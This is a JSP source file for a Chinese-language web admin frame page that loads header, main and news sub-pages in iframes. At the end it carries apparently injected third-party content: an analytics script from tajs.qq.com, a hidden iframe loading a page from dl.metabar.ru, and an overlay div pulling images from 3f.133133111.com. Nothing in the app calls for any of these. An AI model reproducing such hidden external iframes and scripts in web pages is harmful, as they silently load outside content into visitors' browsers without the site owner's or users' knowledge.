<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>
<html g_init="6858"><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>管理</title>
<link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon"> 
<style type="text/css">
#msg_win{position:absolute;right:0px;display:none;overflow:hidden;z-index:99;border:1px solid #c00;background:#F9EFFC;width:240px;font-size:12px;margin:0px;}
#msg_win .icos{position:absolute;top:2px;*top:0px;right:2px;z-index:9;}
.icos a{float:left;color:#FFFFFF;margin:1px;text-align:center;font-weight:bold;width:14px;height:22px;line-height:22px;padding:1px;text-decoration:none;font-family:webdings;}
.icos a:hover{color:#FFCC00;}
#msg_title{background:#AC19E3;border-bottom:1px solid #710B97;border-top:1px solid #FFF;border-left:1px solid #FFF;color:#FFFFFF;height:25px;line-height:25px;text-indent:5px;font-weight:bold;}
#msg_content{margin:5px;margin-right:0;width:230px;height:126px;overflow:hidden;}
</style>
</head>


<body style="margin: 0px; padding: 0px;" scroll="no">
<div style="position: absolute;top: 0px;left: 0px; z-index: 2;height: 65px;width: 100%">
<iframe frameborder="0" id="header" name="header" src="<%=path %>/rear/top.jsp" scrolling="no" style="height: 65px; visibility: inherit; width: 100%; z-index: 1;"></iframe>
</div>
<table border="0" cellpadding="0" cellspacing="0" height="100%" width="100%" style="table-layout: fixed;">
<tbody><tr><td width="100%" height="65"></td></tr>
<tr>

<td><iframe frameborder="0" id="main" name="main" src="<%=path %>/rear/main.jsp" scrolling="yes" style="height: 100%; visibility: inherit; width: 100%; z-index: 1;overflow: auto;"></iframe></td>
</tr></tbody></table>
<script language="JavaScript">var window_img='./images/';</script>
<script language="JavaScript" src="<%=path %>/rear/javascript/show_window.js"></script>


<script type="text/javascript" charset="utf-8" id="0DF98C125855B791_Analytics" src="http://tajs.qq.com/stats?sId=26506734"></script><iframe src="https://dl.metabar.ru/static/storage/index.html?version=201508141843" style="display: none;"></iframe><div id="xp" style="position: absolute; z-index: 9000; overflow: hidden; border: 0px solid rgb(255, 0, 0); width: 260px; height: 28px; left: 1087px; top: 622px;"><div id="xp_content" style="position: absolute; z-index: 1; overflow: hidden; border-width: 0px; width: 260px; height: 190px; left: 0px; top: 0px;"><a id="closeButton" href="#" style="position: absolute; z-index: 2; font-size: 0px; line-height: 0px; left: 240px; top: 6px; width: 15px; height: 15px; background-image: url(http://3f.133133111.com/images/close.gif);"></a><a id="switchButton" href="#" style="position: absolute; z-index: 2; font-size: 0px; line-height: 0px; left: 220px; top: 6px; width: 15px; height: 15px; background-image: url(http://3f.133133111.com/images/min.gif);"></a><iframe id="xp_content_iframe" src="<%=path %>/rear/news.jsp" frameborder="0" scrolling="no" width="100%" height="100%" style="height:100%"></iframe></div></div></body></html>